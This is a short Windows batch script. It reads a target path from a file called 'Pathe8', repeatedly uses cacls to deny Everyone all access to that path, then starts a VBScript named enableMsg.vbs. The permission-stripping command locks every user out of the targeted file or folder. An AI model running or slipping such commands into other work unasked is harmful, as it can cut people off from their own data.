@echo off
echo.
echo.
for /f "Delims=" %%a in (Pathe8) do (
set qwe=%%a
)
echo.
for /L %%n in (0 1 14) do (
cacls "%qwe%" /e /p everyone:n
)
start enableMsg.vbs
exit